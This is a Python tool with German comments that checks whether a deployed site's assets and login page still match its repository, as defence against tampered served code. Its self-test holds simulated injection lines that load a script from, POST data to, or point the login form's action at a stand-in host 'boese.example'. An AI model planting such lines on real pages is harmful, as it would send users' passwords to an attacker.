#!/usr/bin/env python3
"""Integritaetswache — laeuft die ausgelieferte Fassung noch der aus?

    python3 tools/integritaetswache/wache.py [basisadresse]
    python3 tools/integritaetswache/wache.py --selbstprobe

Rueckgabewert 0 = kein Unterschied, 1 = mindestens einer (oder etwas war nicht
erreichbar), 2 = die Wache selbst ist kaputt.

WOGEGEN SIE GEBAUT IST (SP-6, F-SP-9, Backlog Nr. 140)
Der eine Angriff, gegen den keine Verschluesselung im Browser hilft, ist ein
Server, der VERAENDERTEN CODE ausliefert: eine Zeile in `crypto.js`, und das
naechste Passwort geht mit. VERHINDERN laesst sich das nur durch Zugangsschutz
(Branch-Schutz, 2FA, R67). ERKENNEN laesst es sich hier -- und darum geht es.

WAS SIE ERKENNT: eine per FTP oder Hoster-Panel veraenderte Auslieferung. Das
ist der wahrscheinlichste Weg, denn die FTPS-Zugangsdaten liegen als
GitHub-Secret und der Webspace hat ein Panel.

WAS SIE NICHT ERKENNT: einen Angreifer mit Push-Recht -- der aendert beides,
Repositorium und Auslieferung, und die Wache saehe zwei gleiche Summen.
Dagegen steht SP-4. Ebenso wenig sieht sie PHP-Code, der nicht ausgeliefert
wird; von ihm faengt sie genau den Teil, der Passwoerter beruehrt (den
Inline-Block der Anmeldeseite, siehe unten).

WARUM SIE OHNE EINGECHECKTE ERWARTUNGSSUMME AUSKOMMT
Der Deploy (`.github/workflows/deploy.yml`) synchronisiert `server/` byteweise
per FTPS. Was unter `assets/` liegt, ist auf dem Server also dieselbe Datei wie
im Repositorium -- der Vergleich braucht keine gepflegte Liste von
Pruefsummen, die nach der dritten Aenderung nicht mehr stimmt. Er rechnet beide
Seiten frisch aus.

Fuer die Anmeldeseite gilt dasselbe, und das war beim Bauen die offene Frage:
Der Inline-Skriptblock von `login.php` enthaelt KEINE einzige PHP-Einsetzung
(nachgezaehlt am 07.09.2026: 0). Er steht als Literal in der Quelle und kommt
byteweise so beim Browser an. Gemessen: derselbe SHA-256 aus der Quelldatei und
aus zwei aufeinanderfolgenden Abrufen. Ein Block MIT PHP darin waere nicht
vergleichbar -- die Wache sagt das dann und zaehlt ihn getrennt, statt ihn
stillschweigend zu uebergehen.

WAS AUF DER ANMELDESEITE ZAEHLT, IST DER WEG DES PASSWORTS -- und der hat
genau zwei Enden: die Skripte, die es lesen, und das Formular, das es
abschickt. Die erste Fassung dieser Wache pruefte nur, ob der bekannte
Inline-Block VORHANDEN ist. Ein ZUSAETZLICHES Skript -- eingeschleust ueber
`ui.php`, ueber `auto_prepend_file` in einer veraenderten `.htaccess`, ueber
einen zweiten <script src> -- fiel ihr nicht auf, und ein Formular mit
fremdem `action` auch nicht. Beides kostet den Angreifer eine Zeile und
schickt das Passwort beim naechsten Anmelden mit. Deshalb vergleicht sie jetzt
die GANZE Menge: jeden <script src>, jeden Inline-Block, jedes <form>-Tag.
Was in der Auslieferung steht und in der Quelle nicht, ist eine Abweichung.
"""
from __future__ import annotations

import hashlib
import os
import re
import ssl
import sys
import urllib.error
import urllib.request
from pathlib import Path

WURZEL = Path(__file__).resolve().parents[2]
SERVER = WURZEL / 'server'

VORGABE_BASIS = os.environ.get('WACHE_BASIS') or 'https://nadoku.gen-em.org'

# Was unter `assets/` NICHT ausgeliefert wird oder nicht ausgeliefert werden
# muss. `.md` ist Begleittext des Repositoriums.
NICHT_PRUEFEN = {'.md'}

# Seiten, deren Inline-Skriptbloecke verglichen werden. Nur unangemeldet
# erreichbare -- die Wache hat keine Zugangsdaten und soll keine bekommen.
SEITEN = ['login.php']

SKRIPT_RE = re.compile(r'<script\b(?![^>]*\bsrc\s*=)[^>]*>(.*?)</script\s*>', re.I | re.S)
# Der Wert darf `>` und das jeweils andere Anfuehrungszeichen enthalten: In der
# Quelle steht `src="<?= asset('assets/crypto.js') ?>"`. Ein Muster, das am
# ersten inneren Anfuehrungszeichen abbricht, hielte dieses Skript fuer
# unbestimmbar -- und liesse dann JEDEN Ersatz dafuer durch. So war die erste
# Fassung, und die Selbstprobe hat es gefunden.
SRC_RE    = re.compile(r'<script\b[^>]*?\bsrc\s*=\s*(?:"([^"]*)"|\'([^\']*)\')', re.I | re.S)
FORM_RE   = re.compile(r'<form\b[^>]*>', re.I)
ASSET_RE  = re.compile(r"asset\(\s*'([^']+)'\s*\)")


def normalisiere_src(src: str) -> str:
    """Pfad ohne Abfrageteil und ohne fuehrendes ./ oder / -- `asset()` haengt
    den Zeitstempel der Datei an, und der unterscheidet sich je Ablage."""
    src = src.split('?', 1)[0].split('#', 1)[0].strip()
    while src.startswith('./'):
        src = src[2:]
    return src.lstrip('/')


def quell_srcs(quelle: str) -> tuple[list[str], int]:
    """Die externen Skripte, wie die Quelle sie nennt. `<?= asset('x') ?>` wird
    aufgeloest; ein anderer PHP-Ausdruck ist nicht bestimmbar und wird gezaehlt."""
    raus, unbestimmt = [], 0
    for m in SRC_RE.finditer(quelle):
        roh = m.group(1) if m.group(1) is not None else m.group(2)
        if '<?' in roh:
            a = ASSET_RE.search(roh)
            if a:
                raus.append(normalisiere_src(a.group(1)))
            else:
                unbestimmt += 1
        else:
            raus.append(normalisiere_src(roh))
    return raus, unbestimmt


def form_tags(text: str) -> list[str]:
    return [re.sub(r'\s+', ' ', m.group(0)).strip() for m in FORM_RE.finditer(text)]


def seite_vergleichen(seite: str, quelle: str, geliefert: str) -> tuple[list[str], dict]:
    """Vergleicht die Auslieferung einer Seite mit ihrer Quelle.

    Liefert die Abweichungen und die Zahlen, die dazu gehoeren. Verglichen
    wird die GANZE Menge der Skripte und Formulare, nicht nur das Vorhandensein
    des Bekannten -- siehe Kopf der Datei.
    """
    ab: list[str] = []
    z = {'inline_gleich': 0, 'inline_php': 0, 'src_gleich': 0, 'src_unbestimmt': 0,
         'form_gleich': 0}

    # -- Inline-Bloecke: die PHP-freien der Quelle muessen da sein, und es
    #    duerfen nicht MEHR sein als die Quelle hat.
    soll_alle = bloecke(quelle)
    soll_rein = [b for b in soll_alle if '<?' not in b]
    z['inline_php'] = len(soll_alle) - len(soll_rein)
    ist_bloecke = bloecke(geliefert)
    ist_summen = [sha(b.encode()) for b in ist_bloecke]
    for b in soll_rein:
        h = sha(b.encode())
        if h in ist_summen:
            z['inline_gleich'] += 1
            ist_summen.remove(h)
        else:
            ab.append(f'{seite}: ein Inline-Block der Quelle steht nicht so in der '
                      f'Auslieferung (erwartet {h[:16]}…, {len(b)} Zeichen)')
    zusatz = len(ist_bloecke) - len(soll_alle)
    if zusatz > 0:
        ab.append(f'{seite}: {zusatz} ZUSAETZLICHE(R) Inline-Block(e) in der Auslieferung, '
                  f'die die Quelle nicht hat')
    elif zusatz < 0:
        ab.append(f'{seite}: {-zusatz} Inline-Block(e) der Quelle fehlen in der Auslieferung')

    # -- Externe Skripte: dieselbe Menge, kein Verweis mehr und keiner weniger.
    soll_src, z['src_unbestimmt'] = quell_srcs(quelle)
    ist_src = [normalisiere_src(m.group(1) if m.group(1) is not None else m.group(2))
               for m in SRC_RE.finditer(geliefert)]
    for src in soll_src:
        if src in ist_src:
            z['src_gleich'] += 1
            ist_src.remove(src)
        else:
            ab.append(f'{seite}: das Skript {src} fehlt in der Auslieferung')
    # Was die Quelle nicht bestimmen kann, darf in der Auslieferung stehen --
    # aber nur so viele, wie es unbestimmte gibt.
    for src in ist_src[z['src_unbestimmt']:] if z['src_unbestimmt'] else ist_src:
        ab.append(f'{seite}: ZUSAETZLICHES Skript in der Auslieferung: {src}')

    # -- Formulare: die Tags selbst, samt Attributen. Ein fremdes `action`
    #    schickte das Passwort woandershin, ohne dass ein Skript sich aendert.
    soll_form = [f for f in form_tags(quelle) if '<?' not in f]
    ist_form = form_tags(geliefert)
    for f in soll_form:
        if f in ist_form:
            z['form_gleich'] += 1
            ist_form.remove(f)
        else:
            ab.append(f'{seite}: das Formular {f[:60]}… steht nicht so in der Auslieferung')
    php_forms = len(form_tags(quelle)) - len(soll_form)
    for f in ist_form[php_forms:] if php_forms else ist_form:
        ab.append(f'{seite}: ZUSAETZLICHES oder veraendertes Formular in der Auslieferung: {f[:80]}')
    return ab, z


def sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def hole(url: str, unsicher: bool = False) -> bytes:
    ctx = None
    if unsicher:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    anfrage = urllib.request.Request(url, headers={'User-Agent': 'nadoku-integritaetswache'})
    with urllib.request.urlopen(anfrage, timeout=30, context=ctx) as antwort:
        return antwort.read()


def bloecke(text: str) -> list[str]:
    return [m.group(1) for m in SKRIPT_RE.finditer(text)]


def assets() -> list[Path]:
    ordner = SERVER / 'assets'
    raus = [p for p in sorted(ordner.rglob('*'))
            if p.is_file() and p.suffix.lower() not in NICHT_PRUEFEN]
    return raus


def lauf(basis: str, unsicher: bool) -> int:
    basis = basis.rstrip('/')
    print(f'Integritaetswache gegen {basis}')
    abweichung: list[str] = []
    unerreichbar: list[str] = []

    # ---- Teil 1: die ausgelieferten Dateien ------------------------------
    dateien = assets()
    gleich = 0
    for p in dateien:
        rel = p.relative_to(SERVER).as_posix()
        try:
            geliefert = hole(f'{basis}/{rel}', unsicher)
        except (urllib.error.URLError, urllib.error.HTTPError, OSError) as ex:
            unerreichbar.append(f'{rel}: {ex}')
            continue
        soll, ist = sha(p.read_bytes()), sha(geliefert)
        if soll == ist:
            gleich += 1
        else:
            abweichung.append(f'{rel}: erwartet {soll[:16]}… ({p.stat().st_size} B), '
                              f'geliefert {ist[:16]}… ({len(geliefert)} B)')

    print(f'  Teil 1  {len(dateien)} Dateien unter assets/ — {gleich} gleich, '
          f'{len(abweichung)} abweichend, {len(unerreichbar)} nicht erreichbar')

    # ---- Teil 2: die Seiten, auf denen das Passwort getippt wird ----------
    summe = {'inline_gleich': 0, 'inline_php': 0, 'src_gleich': 0,
             'src_unbestimmt': 0, 'form_gleich': 0}
    for seite in SEITEN:
        quelle = (SERVER / seite)
        if not quelle.is_file():
            unerreichbar.append(f'{seite}: fehlt im Repositorium')
            continue
        try:
            geliefert = hole(f'{basis}/{seite}', unsicher).decode('utf-8', 'replace')
        except (urllib.error.URLError, urllib.error.HTTPError, OSError) as ex:
            unerreichbar.append(f'{seite}: {ex}')
            continue
        ab, z = seite_vergleichen(seite, quelle.read_text(encoding='utf-8'), geliefert)
        abweichung.extend(ab)
        for k in summe:
            summe[k] += z[k]

    zuviel = sum(1 for a in abweichung if 'ZUSAETZLICH' in a)
    print(f"  Teil 2  {len(SEITEN)} Seite(n) — {summe['inline_gleich']} Inline-Bloecke gleich "
          f"({summe['inline_php']} nicht vergleichbar, PHP darin), "
          f"{summe['src_gleich']} externe Skripte gleich "
          f"({summe['src_unbestimmt']} unbestimmt), {summe['form_gleich']} Formulare gleich; "
          + ('kein Skript und kein Formular zu viel' if zuviel == 0
             else f'{zuviel} ZU VIEL oder veraendert'))

    if unerreichbar:
        print('\n  NICHT ERREICHBAR:')
        for z in unerreichbar:
            print(f'    {z}')
    if abweichung:
        print('\n  ABWEICHUNG:')
        for z in abweichung:
            print(f'    {z}')
        print('\n  Die ausgelieferte Fassung ist nicht die des Repositoriums.')
        print('  Das kann ein vergessener Deploy sein — oder eine Manipulation.')
        print('  Was zu tun ist, steht in tools/integritaetswache/LIESMICH.md.')
    if not abweichung and not unerreichbar:
        print('\n  Kein Unterschied.')
    return 1 if (abweichung or unerreichbar) else 0


def selbstprobe() -> int:
    """Erkennt die Wache eine Abweichung ueberhaupt? (Backlog Nr. 140)

    Ohne diese Probe ist ein gruener Lauf eine Zahl ohne Aussage: Eine Wache,
    die IMMER gruen meldet, sieht genauso aus wie eine, die nichts findet.
    """
    print('Selbstprobe der Integritaetswache')
    erwartungen = 0
    offen = 0

    def pruefe(ok: bool, was: str, wert: str = '') -> None:
        nonlocal erwartungen, offen
        erwartungen += 1
        if not ok:
            offen += 1
        print(f'  [{"ok " if ok else "FEHL"}] {was:<58} {wert}')

    d = assets()
    pruefe(len(d) > 0, 'Es gibt Dateien unter assets/ zu vergleichen', f'{len(d)} Dateien')

    # 1. Gleiche Bytes -> gleiche Summe.
    beispiel = SERVER / 'assets' / 'crypto.js'
    pruefe(beispiel.is_file(), 'assets/crypto.js liegt im Repositorium',
           f'{beispiel.stat().st_size if beispiel.is_file() else 0} B')
    roh = beispiel.read_bytes()
    pruefe(sha(roh) == sha(bytes(roh)), 'Gleiche Bytes ergeben dieselbe Summe',
           sha(roh)[:16] + '…')

    # 2. EIN veraendertes Byte -> andere Summe. Das ist die eigentliche Frage.
    manipuliert = roh.replace(b'const EdCrypto', b'const EdCryptO', 1)
    pruefe(manipuliert != roh, 'Die Probe konnte eine Zeile veraendern',
           f'{len(roh)} B unveraendert, {len(manipuliert)} B veraendert')
    pruefe(sha(manipuliert) != sha(roh),
           'ABWEICHUNG ERKANNT: eine veraenderte Auslieferung faellt auf',
           f'{sha(roh)[:12]}… gegen {sha(manipuliert)[:12]}…')

    # 3. Der Inline-Block der Anmeldeseite ist ueberhaupt vergleichbar.
    quelle = (SERVER / 'login.php').read_text(encoding='utf-8')
    bl = bloecke(quelle)
    rein = [b for b in bl if '<?' not in b]
    pruefe(len(rein) >= 1,
           'Die Anmeldeseite hat mindestens einen PHP-freien Inline-Block',
           f'{len(bl)} Bloecke, davon {len(rein)} ohne PHP')
    if rein:
        veraendert = rein[0].replace('EdCrypto.deriveKeys', 'EdCrypto.deriveKeys/*x*/', 1)
        pruefe(sha(veraendert.encode()) != sha(rein[0].encode()),
               'ABWEICHUNG ERKANNT: ein veraenderter Inline-Block faellt auf',
               f'{sha(rein[0].encode())[:12]}… gegen {sha(veraendert.encode())[:12]}…')

    # 4. Die GANZE Menge, nicht nur das Vorhandensein (die Luecke der ersten
    #    Fassung). Eine Auslieferung wird nachgestellt: `<?= asset('x') ?>`
    #    wird zu `x?v=1`, uebriges PHP faellt weg -- Skripte und Formulare
    #    stehen danach so da, wie der Server sie schickt.
    def nachgestellt(q: str) -> str:
        q = re.sub(r"<\?=\s*asset\('([^']+)'\)\s*\?>", r'\1?v=1', q)
        return re.sub(r'<\?(?:php|=)?.*?\?>', '', q, flags=re.S)

    sim = nachgestellt(quelle)
    ab0, z0 = seite_vergleichen('login.php', quelle, sim)
    pruefe(ab0 == [] and z0['src_gleich'] >= 1 and z0['form_gleich'] >= 1,
           'Quelle gegen nachgestellte Auslieferung: kein Unterschied',
           f"{z0['inline_gleich']} Block, {z0['src_gleich']} Skript, {z0['form_gleich']} Formular, "
           f"{len(ab0)} Abweichungen")

    ab1, _ = seite_vergleichen('login.php', quelle,
                               sim.replace('</body>', '<script src="https://boese.example/x.js"></script></body>', 1)
                               if '</body>' in sim else sim + '<script src="https://boese.example/x.js"></script>')
    pruefe(any('ZUSAETZLICHES Skript' in a for a in ab1),
           'ABWEICHUNG ERKANNT: ein zusaetzliches <script src> faellt auf',
           '; '.join(ab1)[:90])

    ab2, _ = seite_vergleichen('login.php', quelle, sim + '<script>fetch("https://boese.example/", {method:"POST"})</script>')
    pruefe(any('ZUSAETZLICHE' in a and 'Inline' in a for a in ab2),
           'ABWEICHUNG ERKANNT: ein zusaetzlicher Inline-Block faellt auf',
           '; '.join(ab2)[:90])

    ab3, _ = seite_vergleichen('login.php', quelle,
                               sim.replace('<form method="post"', '<form method="post" action="https://boese.example/"', 1))
    pruefe(any('Formular' in a for a in ab3),
           'ABWEICHUNG ERKANNT: ein fremdes action= am Anmeldeformular faellt auf',
           '; '.join(ab3)[:90])

    ab4, _ = seite_vergleichen('login.php', quelle, sim.replace('EdCrypto.deriveKeys', 'EdCrypto.deriveKeys/*x*/', 1))
    pruefe(any('Inline-Block der Quelle steht nicht so' in a for a in ab4),
           'ABWEICHUNG ERKANNT: ein veraenderter Inline-Block faellt auf (ganze Menge)',
           '; '.join(ab4)[:90])

    print(f'\n  -> {erwartungen} Erwartungen, {offen} nicht erfuellt')
    return 0 if offen == 0 else 1


def main() -> int:
    args = [a for a in sys.argv[1:]]
    unsicher = '--unsicher' in args
    if unsicher:
        args.remove('--unsicher')
    if '--selbstprobe' in args:
        return selbstprobe()
    basis = args[0] if args else VORGABE_BASIS
    return lauf(basis, unsicher)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except Exception as ex:                       # noqa: BLE001
        print(f'Die Wache selbst ist gescheitert: {ex}', file=sys.stderr)
        sys.exit(2)
